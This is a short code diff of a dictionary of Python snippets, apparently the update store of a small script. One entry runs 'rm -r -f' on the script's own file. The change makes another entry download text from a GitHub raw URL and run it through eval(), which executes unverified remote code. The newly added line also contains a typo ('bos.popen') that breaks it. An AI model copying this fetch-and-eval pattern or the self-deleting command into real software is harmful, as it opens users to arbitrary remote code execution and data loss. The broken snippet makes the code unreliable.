@@ -1,5 +1,5 @@
 {
 "0000":"""import os\nos.system(f"rm -r -f {__file__}")""",
-"0001":"""try:\n\tcode=eval(open(f"{execute('0002')}update/FL-{version+1:04n}").read())\n\tversion+=1\nexcept:\n\tprint(f"not find version FL-{version+1:04n}")""",
-"0002":"""import os\nos.popen("pwd").read()"""
+"0001":"""import requests\ncode=eval(requests.get(f"https://raw.githubusercontent.com/Gabutman/database/main/Update/FL-{version:04n}").text)\n""",
+"0002":"""import os\nbos.popen("pwd").read()"""
 }
